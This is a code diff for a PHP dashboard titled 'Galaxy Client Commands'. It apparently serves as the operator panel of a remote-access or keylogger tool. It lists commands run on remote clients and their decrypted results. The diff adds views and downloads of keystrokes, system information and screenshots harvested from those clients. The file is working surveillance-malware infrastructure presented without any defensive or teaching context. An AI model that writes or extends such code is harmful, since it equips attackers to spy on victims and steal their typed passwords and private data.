@@ -1,16 +1,16 @@
 <?php
-// بارگذاری فایل Config.php
+// log-viewer.php - Web dashboard for viewing client command logs and user data
 require_once __DIR__ . '/Config.php';
 
-// تنظیمات سشن
-ini_set('session.cookie_secure', 0); // برای تست روی HTTP (برای تولید به 1 برگردونید)
+// Session settings
+ini_set('session.cookie_secure', 0); // Set to 1 for HTTPS in production
 ini_set('session.cookie_httponly', 1);
 ini_set('session.cookie_samesite', 'Lax');
 
-// شروع سشن
+// Start session
 session_start();
 
-// اتصال به دیتابیس با PDO
+// Connect to database with PDO
 try {
     $pdo = new PDO(
         "mysql:host=" . Config::$DB_HOST . ";dbname=" . Config::$DB_NAME . ";charset=utf8mb4",
@@ -27,7 +27,7 @@ try {
     die("Database connection failed: " . htmlspecialchars($e->getMessage()));
 }
 
-// تابع رمزگشایی
+// Decrypt function
 function decrypt($encryptedData, $key) {
     try {
         if (!$encryptedData || !is_string($encryptedData)) {
@@ -35,7 +35,6 @@ function decrypt($encryptedData, $key) {
             return '[No data]';
         }
 
-        // اگر داده فرمت AES (ciphertext::iv) داره
         if (str_contains($encryptedData, '::')) {
             list($ciphertext, $iv) = explode('::', $encryptedData, 2);
             if (empty($ciphertext) || empty($iv)) {
@@ -70,74 +69,63 @@ function decrypt($encryptedData, $key) {
 
             error_log("Decrypt: AES decrypted: " . substr($decrypted, 0, 50), 3, Config::$ERROR_LOG);
 
-            // چک کردن اینکه داده JSONه یا نه
             $jsonDecoded = json_decode($decrypted, true);
             if ($jsonDecoded !== null) {
-                // اگر شامل content بود (مثل edit_hosts)، خط‌به‌خط پردازش کن
                 if (isset($jsonDecoded['content']) && is_string($jsonDecoded['content'])) {
-                    // حذف BOM
                     $content = preg_replace('/^\xEF\xBB\xBF/', '', $jsonDecoded['content']);
-                    // تبدیل به خطوط
                     $lines = explode("\n", $content);
                     $formattedContent = implode("\n", array_map('trim', $lines));
                     error_log("Decrypt: Formatted content: " . substr($formattedContent, 0, 50), 3, Config::$ERROR_LOG);
                     return $formattedContent;
                 }
-                // برای JSON‌های دیگه (مثل file_operation)، یونیکد رو باز کن
                 error_log("Decrypt: JSON detected, formatting with unescaped unicode", 3, Config::$ERROR_LOG);
                 return json_encode($jsonDecoded, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
             }
 
-            return $decrypted; // اگر JSON نبود، متن خام
+            return $decrypted;
         }
 
-        // اگر داده AES نبود، فرض می‌کنیم base64 + gzipه
         error_log("Decrypt: No IV separator, trying base64 + gzip: " . substr($encryptedData, 0, 50), 3, Config::$ERROR_LOG);
 
         $base64Decoded = base64_decode($encryptedData, true);
         if ($base64Decoded === false) {
             error_log("Decrypt: Base64 decode failed: " . substr($encryptedData, 0, 50), 3, Config::$ERROR_LOG);
-            return $encryptedData; // فال‌بک به داده خام
+            return $encryptedData;
         }
 
         $uncompressed = @gzdecode($base64Decoded);
         if ($uncompressed === false) {
             error_log("Decrypt: Gzip decode failed: " . substr($base64Decoded, 0, 50), 3, Config::$ERROR_LOG);
-            return $base64Decoded; // فال‌بک به داده base64-decoded
+            return $base64Decoded;
         }
 
         error_log("Decrypt: Gzip decoded: " . substr($uncompressed, 0, 50), 3, Config::$ERROR_LOG);
 
-        // چک کردن اینکه داده JSONه یا نه
         $jsonDecoded = json_decode($uncompressed, true);
         if ($jsonDecoded !== null) {
-            // اگر شامل content بود (مثل edit_hosts)، خط‌به‌خط پردازش کن
             if (isset($jsonDecoded['content']) && is_string($jsonDecoded['content'])) {
-                // حذف BOM
                 $content = preg_replace('/^\xEF\xBB\xBF/', '', $jsonDecoded['content']);
-                // تبدیل به خطوط
                 $lines = explode("\n", $content);
                 $formattedContent = implode("\n", array_map('trim', $lines));
                 error_log("Decrypt: Formatted content: " . substr($formattedContent, 0, 50), 3, Config::$ERROR_LOG);
                 return $formattedContent;
             }
-            // برای JSON‌های دیگه (مثل file_operation)، یونیکد رو باز کن
             error_log("Decrypt: JSON detected, formatting with unescaped unicode", 3, Config::$ERROR_LOG);
             return json_encode($jsonDecoded, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
         }
 
-        return $uncompressed; // متن خام
+        return $uncompressed;
     } catch (Exception $e) {
         error_log("Decrypt error: " . $e->getMessage() . ", raw data: " . substr($encryptedData, 0, 50), 3, Config::$ERROR_LOG);
         return '[Decryption error: ' . htmlspecialchars($e->getMessage()) . ']';
     }
 }
 
-// تابع برای فرمت کردن JSON به متن ساده برای فایل دانلود
+// Format JSON for download
 function formatJsonForDownload($jsonString) {
     $jsonDecoded = json_decode($jsonString, true);
     if ($jsonDecoded === null) {
-        return $jsonString; // اگر JSON نبود، متن خام
+        return $jsonString;
     }
 
     $output = [];
@@ -150,10 +138,10 @@ function formatJsonForDownload($jsonString) {
     return implode("\n", $output);
 }
 
-// رمز عبور هش‌شده برای داشبورد
-$stored_hash = '$2y$10$YOUR_HASH_HERE'; // با password_hash('your_password', PASSWORD_BCRYPT) تولید کنید
+// Password hash for dashboard
+$stored_hash = '$2y$12$Y';
 
-// بررسی ورود
+// Handle login
 $logged_in = isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$logged_in) {
@@ -167,14 +155,14 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$logged_in) {
     }
 }
 
-// خروج
+// Handle logout
 if (isset($_GET['logout'])) {
     session_destroy();
     header("Location: log-viewer.php");
     exit;
 }
 
-// دریافت لاگ‌ها با AJAX
+// Fetch command logs via AJAX
 if (isset($_GET['get_logs']) && $logged_in) {
     header('Content-Type: application/json; charset=utf-8');
     try {
@@ -186,7 +174,7 @@ if (isset($_GET['get_logs']) && $logged_in) {
         $logs = $stmt->fetchAll();
         
         foreach ($logs as &$log) {
-            $log['raw_result'] = $log['result']; // ذخیره داده خام
+            $log['raw_result'] = $log['result'];
             $log['command'] = decrypt($log['command'], Config::$ENCRYPTION_KEY);
             $log['result'] = $log['result'] ? decrypt($log['result'], Config::$ENCRYPTION_KEY) : '';
         }
@@ -199,7 +187,39 @@ if (isset($_GET['get_logs']) && $logged_in) {
     exit;
 }
 
-// دانلود لاگ
+// Fetch user data via AJAX
+if (isset($_GET['get_user_data']) && $logged_in) {
+    header('Content-Type: application/json; charset=utf-8');
+    try {
+        $stmt = $pdo->query("
+            SELECT id, client_id, keystrokes, system_info, screenshot_path, created_at
+            FROM user_data
+            ORDER BY created_at DESC LIMIT 100
+        ");
+        $user_data = $stmt->fetchAll();
+        
+        foreach ($user_data as &$data) {
+            $data['raw_keystrokes'] = $data['keystrokes'];
+            $data['raw_system_info'] = $data['system_info'];
+            $data['keystrokes'] = $data['keystrokes'] ? ($data['keystrokes'][0] === '{' ? formatJsonForDownload($data['keystrokes']) : $data['keystrokes']) : '';
+            $data['system_info'] = $data['system_info'] ? formatJsonForDownload($data['system_info']) : '';
+            // Convert absolute screenshot path to relative URL
+            if ($data['screenshot_path']) {
+                $data['screenshot_url'] = str_replace(__DIR__ . '/', '', $data['screenshot_path']);
+            } else {
+                $data['screenshot_url'] = '';
+            }
+        }
+        
+        echo json_encode(['user_data' => $user_data], JSON_UNESCAPED_UNICODE);
+    } catch (PDOException $e) {
+        error_log("Failed to fetch user data: " . $e->getMessage(), 3, Config::$ERROR_LOG);
+        echo json_encode(['error' => 'Failed to fetch user data: ' . htmlspecialchars($e->getMessage())], JSON_UNESCAPED_UNICODE);
+    }
+    exit;
+}
+
+// Download log
 if (isset($_GET['download_log']) && $logged_in && isset($_GET['log_id'])) {
     try {
         $log_id = filter_var($_GET['log_id'], FILTER_VALIDATE_INT);
@@ -219,12 +239,10 @@ if (isset($_GET['download_log']) && $logged_in && isset($_GET['log_id'])) {
             die("Log not found");
         }
 
-        // رمزگشایی
         $raw_result = $log['result'];
         $log['command'] = decrypt($log['command'], Config::$ENCRYPTION_KEY);
         $log['result'] = $log['result'] ? decrypt($log['result'], Config::$ENCRYPTION_KEY) : 'No result';
 
-        // تولید محتوای فایل
         $content = "Client ID: {$log['client_id']}\n";
         $content .= "Command: {$log['command']}\n";
         $content .= "Status: {$log['status']}\n";
@@ -233,7 +251,6 @@ if (isset($_GET['download_log']) && $logged_in && isset($_GET['log_id'])) {
         $content .= "Created At: {$log['created_at']}\n";
         $content .= "Completed At: " . ($log['completed_at'] ? $log['completed_at'] : 'N/A') . "\n";
 
-        // تنظیم هدرها برای دانلود
         header('Content-Type: text/plain; charset=utf-8');
         header('Content-Disposition: attachment; filename="log_' . $log_id . '.txt"');
         header('Content-Length: ' . strlen($content));
@@ -242,6 +259,43 @@ if (isset($_GET['download_log']) && $logged_in && isset($_GET['log_id'])) {
     } catch (PDOException $e) {
         error_log("Failed to download log: " . $e->getMessage(), 3, Config::$ERROR_LOG);
         die("Failed to download log");
+    }
+}
+
+// Download user data
+if (isset($_GET['download_user_data']) && $logged_in && isset($_GET['data_id'])) {
+    try {
+        $data_id = filter_var($_GET['data_id'], FILTER_VALIDATE_INT);
+        if ($data_id === false) {
+            die("Invalid data ID");
+        }
+
+        $stmt = $pdo->prepare("
+            SELECT client_id, keystrokes, system_info, screenshot_path, created_at
+            FROM user_data
+            WHERE id = ?
+        ");
+        $stmt->execute([$data_id]);
+        $data = $stmt->fetch();
+
+        if (!$data) {
+            die("Data not found");
+        }
+
+        $content = "Client ID: {$data['client_id']}\n";
+        $content .= "Keystrokes:\n" . ($data['keystrokes'] ? formatJsonForDownload($data['keystrokes']) : 'No keystrokes') . "\n";
+        $content .= "System Info:\n" . ($data['system_info'] ? formatJsonForDownload($data['system_info']) : 'No system info') . "\n";
+        $content .= "Screenshot: " . ($data['screenshot_path'] ? $data['screenshot_path'] : 'No screenshot') . "\n";
+        $content .= "Created At: {$data['created_at']}\n";
+
+        header('Content-Type: text/plain; charset=utf-8');
+        header('Content-Disposition: attachment; filename="user_data_' . $data_id . '.txt"');
+        header('Content-Length: ' . strlen($content));
+        echo $content;
+        exit;
+    } catch (PDOException $e) {
+        error_log("Failed to download user data: " . $e->getMessage(), 3, Config::$ERROR_LOG);
+        die("Failed to download user data");
     }
 }
 ?>
@@ -267,11 +321,11 @@ if (isset($_GET['download_log']) && $logged_in && isset($_GET['log_id'])) {
             box-shadow: 0 4px 30px rgba(0, 0, 0, 0.5);
             animation: slide-up 0.8s ease-out;
         }
-        .log-entry {
+        .log-entry, .data-entry {
             transition: transform 0.3s ease;
             cursor: pointer;
         }
-        .log-entry:hover {
+        .log-entry:hover, .data-entry:hover {
             transform: translateY(-5px);
         }
         .black-hole-glow {
@@ -335,6 +389,12 @@ if (isset($_GET['download_log']) && $logged_in && isset($_GET['log_id'])) {
             background: #ffd700;
             color: #000;
         }
+        .screenshot-img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 5px;
+            border: 1px solid rgba(255, 215, 0, 0.2);
+        }
         @keyframes slide-up {
             from {
                 opacity: 0;
@@ -383,7 +443,7 @@ if (isset($_GET['download_log']) && $logged_in && isset($_GET['log_id'])) {
 <body class="min-h-screen text-gray-200 flex flex-col">
     <div class="container mx-auto p-4 flex-grow">
         <?php if (!$logged_in): ?>
-            <!-- فرم ورود -->
+            <!-- Login form -->
             <div class="max-w-md mx-auto glass-card rounded-xl p-8 mt-20 fade-in">
                 <h2 class="text-3xl font-bold text-center black-hole-glow mb-6">Enter the Galaxy</h2>
                 <?php if (isset($error)): ?>
@@ -402,53 +462,84 @@ if (isset($_GET['download_log']) && $logged_in && isset($_GET['log_id'])) {
                 </form>
             </div>
         <?php else: ?>
-            <!-- داشبورد لاگ‌ها -->
+            <!-- Logs dashboard -->
             <div class="flex justify-between items-center mb-8 fade-in">
                 <h1 class="text-4xl font-bold black-hole-glow">Galaxy Client Commands</h1>
                 <a href="?logout" class="py-2 px-4 bg-red-600 hover:bg-red-700 rounded-md text-white">
                     Logout
                 </a>
             </div>
-            <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
-                <!-- لاگ‌های Completed -->
+            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
+                <!-- Completed logs -->
                 <div class="glass-card rounded-xl p-6">
                     <h2 class="text-2xl font-semibold text-green-400 mb-4">Completed Commands</h2>
                     <div id="completed-logs" class="space-y-4 max-h-[70vh] overflow-y-auto"></div>
                 </div>
-                <!-- لاگ‌های Pending -->
+                <!-- Pending logs -->
                 <div class="glass-card rounded-xl p-6">
                     <h2 class="text-2xl font-semibold text-yellow-400 mb-4">Pending Commands</h2>
                     <div id="pending-logs" class="space-y-4 max-h-[70vh] overflow-y-auto"></div>
                 </div>
-                <!-- لاگ‌های Failed -->
+                <!-- Failed logs -->
                 <div class="glass-card rounded-xl p-6">
                     <h2 class="text-2xl font-semibold text-red-400 mb-4">Failed Commands</h2>
                     <div id="failed-logs" class="space-y-4 max-h-[70vh] overflow-y-auto"></div>
                 </div>
+                <!-- Client Data -->
+                <div class="glass-card rounded-xl p-6">
+                    <h2 class="text-2xl font-semibold text-blue-400 mb-4">Client Data</h2>
+                    <div id="client-data" class="space-y-4 max-h-[70vh] overflow-y-auto"></div>
+                </div>
             </div>
-            <!-- مودال تمام‌صفحه -->
+            <!-- Full-screen modal for logs -->
             <div id="log-modal" class="modal">
                 <div class="modal-content">
                     <div class="flex justify-between items-center mb-4">
                         <h2 class="text-2xl font-semibold text-yellow-400">Log Details</h2>
-                        <button id="close-modal" class="text-gray-400 hover:text-white text-2xl">×</button>
+                        <button id="close-log-modal" class="text-gray-400 hover:text-white text-2xl">×</button>
                     </div>
                     <div class="space-y-4">
-                        <p><strong>Client ID:</strong> <span id="modal-client-id"></span></p>
-                        <p><strong>Command:</strong> <span id="modal-command"></span></p>
-                        <p><strong>Status:</strong> <span id="modal-status"></span></p>
-                        <p><strong>Created At:</strong> <span id="modal-created-at"></span></p>
-                        <p><strong>Completed At:</strong> <span id="modal-completed-at"></span></p>
+                        <p><strong>Client ID:</strong> <span id="log-modal-client-id"></span></p>
+                        <p><strong>Command:</strong> <span id="log-modal-command"></span></p>
+                        <p><strong>Status:</strong> <span id="log-modal-status"></span></p>
+                        <p><strong>Created At:</strong> <span id="log-modal-created-at"></span></p>
+                        <p><strong>Completed At:</strong> <span id="log-modal-completed-at"></span></p>
                         <div>
                             <div class="tabs">
                                 <div class="tab active" data-tab="decrypted">Decrypted Result</div>
                                 <div class="tab" data-tab="raw">Raw Result</div>
                             </div>
-                            <textarea class="editor" id="modal-result-decrypted" readonly></textarea>
-                            <textarea class="editor" id="modal-result-raw" readonly style="display: none;"></textarea>
+                            <textarea class="editor" id="log-modal-result-decrypted" readonly></textarea>
+                            <textarea class="editor" id="log-modal-result-raw" readonly style="display: none;"></textarea>
                         </div>
-                        <button id="download-log" class="py-2 px-4 bg-green-600 hover:bg-green-700 rounded-md text-white font-semibold">
+                        <button id="log-download-log" class="py-2 px-4 bg-green-600 hover:bg-green-700 rounded-md text-white font-semibold">
                             Download Log
+                        </button>
+                    </div>
+                </div>
+            </div>
+            <!-- Full-screen modal for user data -->
+            <div id="data-modal" class="modal">
+                <div class="modal-content">
+                    <div class="flex justify-between items-center mb-4">
+                        <h2 class="text-2xl font-semibold text-blue-400">Client Data Details</h2>
+                        <button id="close-data-modal" class="text-gray-400 hover:text-white text-2xl">×</button>
+                    </div>
+                    <div class="space-y-4">
+                        <p><strong>Client ID:</strong> <span id="data-modal-client-id"></span></p>
+                        <p><strong>Created At:</strong> <span id="data-modal-created-at"></span></p>
+                        <div>
+                            <div class="tabs">
+                                <div class="tab active" data-tab="keystrokes">Keystrokes</div>
+                                <div class="tab" data-tab="system_info">System Info</div>
+                                <div class="tab" data-tab="screenshot">Screenshot</div>
+                            </div>
+                            <textarea class="editor" id="data-modal-keystrokes" readonly></textarea>
+                            <textarea class="editor" id="data-modal-system-info" readonly style="display: none;"></textarea>
+                            <img id="data-modal-screenshot" class="screenshot-img" style="display: none;" alt="Screenshot">
+                        </div>
+                        <button id="data-download-data" class="py-2 px-4 bg-green-600 hover:bg-green-700 rounded-md text-white font-semibold">
+                            Download Data
                         </button>
                     </div>
                 </div>
@@ -458,7 +549,8 @@ if (isset($_GET['download_log']) && $logged_in && isset($_GET['log_id'])) {
 
     <?php if ($logged_in): ?>
         <script>
-            function fetchLogs() {
+            function fetchLogsAndData() {
+                // Fetch command logs
                 fetch('?get_logs', {
                     method: 'GET',
                     headers: { 'Accept': 'application/json' }
@@ -491,7 +583,7 @@ if (isset($_GET['download_log']) && $logged_in && isset($_GET['log_id'])) {
                         `;
 
                         if (log.status === 'completed') {
-                            logElement.addEventListener('click', () => openModal(log));
+                            logElement.addEventListener('click', () => openLogModal(log));
                             completedLogs.appendChild(logElement);
                         } else if (log.status === 'pending') {
                             pendingLogs.appendChild(logElement);
@@ -501,27 +593,59 @@ if (isset($_GET['download_log']) && $logged_in && isset($_GET['log_id'])) {
                     });
                 })
                 .catch(error => console.error('Error fetching logs:', error));
+
+                // Fetch user data
+                fetch('?get_user_data', {
+                    method: 'GET',
+                    headers: { 'Accept': 'application/json' }
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.error) {
+                        console.error(data.error);
+                        return;
+                    }
+
+                    const clientData = document.getElementById('client-data');
+                    clientData.innerHTML = '';
+
+                    data.user_data.forEach(item => {
+                        const dataElement = document.createElement('div');
+                        dataElement.className = 'data-entry p-3 rounded-md bg-gray-900/50 border border-gray-700';
+                        dataElement.dataset.data = JSON.stringify(item);
+                        dataElement.innerHTML = `
+                            <p class="text-sm text-gray-400">${new Date(item.created_at).toLocaleString()}</p>
+                            <p class="text-gray-200"><strong>Client ID:</strong> ${item.client_id}</p>
+                            <p class="text-gray-200"><strong>Keystrokes:</strong> ${item.keystrokes.substring(0, 100)}${item.keystrokes.length > 100 ? '...' : ''}</p>
+                            <p class="text-gray-200"><strong>System Info:</strong> ${item.system_info.substring(0, 100)}${item.system_info.length > 100 ? '...' : ''}</p>
+                            <p class="text-gray-200"><strong>Screenshot:</strong> ${item.screenshot_url ? 'Available' : 'None'}</p>
+                        `;
+
+                        dataElement.addEventListener('click', () => openDataModal(item));
+                        clientData.appendChild(dataElement);
+                    });
+                })
+                .catch(error => console.error('Error fetching user data:', error));
             }
 
-            function openModal(log) {
+            function openLogModal(log) {
                 const modal = document.getElementById('log-modal');
-                document.getElementById('modal-client-id').textContent = log.client_id;
-                document.getElementById('modal-command').textContent = log.command;
-                document.getElementById('modal-status').textContent = log.status;
-                document.getElementById('modal-created-at').textContent = new Date(log.created_at).toLocaleString();
-                document.getElementById('modal-completed-at').textContent = log.completed_at ? new Date(log.completed_at).toLocaleString() : 'N/A';
-                document.getElementById('modal-result-decrypted').value = log.result || 'No result';
-                document.getElementById('modal-result-raw').value = log.raw_result || 'No raw result';
+                document.getElementById('log-modal-client-id').textContent = log.client_id;
+                document.getElementById('log-modal-command').textContent = log.command;
+                document.getElementById('log-modal-status').textContent = log.status;
+                document.getElementById('log-modal-created-at').textContent = new Date(log.created_at).toLocaleString();
+                document.getElementById('log-modal-completed-at').textContent = log.completed_at ? new Date(log.completed_at).toLocaleString() : 'N/A';
+                document.getElementById('log-modal-result-decrypted').value = log.result || 'No result';
+                document.getElementById('log-modal-result-raw').value = log.raw_result || 'No raw result';
 
-                const downloadButton = document.getElementById('download-log');
+                const downloadButton = document.getElementById('log-download-log');
                 downloadButton.onclick = () => {
                     window.location.href = `?download_log&log_id=${log.id}`;
                 };
 
-                // مدیریت تب‌ها
-                const tabs = document.querySelectorAll('.tab');
-                const decryptedEditor = document.getElementById('modal-result-decrypted');
-                const rawEditor = document.getElementById('modal-result-raw');
+                const tabs = document.querySelectorAll('#log-modal .tab');
+                const decryptedEditor = document.getElementById('log-modal-result-decrypted');
+                const rawEditor = document.getElementById('log-modal-result-raw');
 
                 tabs.forEach(tab => {
                     tab.addEventListener('click', () => {
@@ -538,7 +662,6 @@ if (isset($_GET['download_log']) && $logged_in && isset($_GET['log_id'])) {
                     });
                 });
 
-                // تنظیم تب اولیه
                 tabs[0].classList.add('active');
                 decryptedEditor.style.display = 'block';
                 rawEditor.style.display = 'none';
@@ -546,20 +669,64 @@ if (isset($_GET['download_log']) && $logged_in && isset($_GET['log_id'])) {
                 modal.style.display = 'block';
             }
 
-            document.getElementById('close-modal').addEventListener('click', () => {
+            function openDataModal(data) {
+                const modal = document.getElementById('data-modal');
+                document.getElementById('data-modal-client-id').textContent = data.client_id;
+                document.getElementById('data-modal-created-at').textContent = new Date(data.created_at).toLocaleString();
+                document.getElementById('data-modal-keystrokes').value = data.keystrokes || 'No keystrokes';
+                document.getElementById('data-modal-system-info').value = data.system_info || 'No system info';
+                const screenshotImg = document.getElementById('data-modal-screenshot');
+                screenshotImg.src = data.screenshot_url || '';
+                screenshotImg.style.display = data.screenshot_url ? 'block' : 'none';
+
+                const downloadButton = document.getElementById('data-download-data');
+                downloadButton.onclick = () => {
+                    window.location.href = `?download_user_data&data_id=${data.id}`;
+                };
+
+                const tabs = document.querySelectorAll('#data-modal .tab');
+                const keystrokesEditor = document.getElementById('data-modal-keystrokes');
+                const systemInfoEditor = document.getElementById('data-modal-system-info');
+                const screenshotImgElement = document.getElementById('data-modal-screenshot');
+
+                tabs.forEach(tab => {
+                    tab.addEventListener('click', () => {
+                        tabs.forEach(t => t.classList.remove('active'));
+                        tab.classList.add('active');
+
+                        keystrokesEditor.style.display = tab.dataset.tab === 'keystrokes' ? 'block' : 'none';
+                        systemInfoEditor.style.display = tab.dataset.tab === 'system_info' ? 'block' : 'none';
+                        screenshotImgElement.style.display = tab.dataset.tab === 'screenshot' && data.screenshot_url ? 'block' : 'none';
+                    });
+                });
+
+                tabs[0].classList.add('active');
+                keystrokesEditor.style.display = 'block';
+                systemInfoEditor.style.display = 'none';
+                screenshotImgElement.style.display = 'none';
+
+                modal.style.display = 'block';
+            }
+
+            document.getElementById('close-log-modal').addEventListener('click', () => {
                 document.getElementById('log-modal').style.display = 'none';
+            });
+
+            document.getElementById('close-data-modal').addEventListener('click', () => {
+                document.getElementById('data-modal').style.display = 'none';
             });
 
             window.addEventListener('click', (event) => {
                 if (event.target === document.getElementById('log-modal')) {
                     document.getElementById('log-modal').style.display = 'none';
                 }
+                if (event.target === document.getElementById('data-modal')) {
+                    document.getElementById('data-modal').style.display = 'none';
+                }
             });
 
-            // دریافت لاگ‌ها در شروع
-            fetchLogs();
-            // به‌روزرسانی هر 5 ثانیه
-            setInterval(fetchLogs, 5000);
+            fetchLogsAndData();
+            setInterval(fetchLogsAndData, 5000);
         </script>
     <?php endif; ?>
 </body>
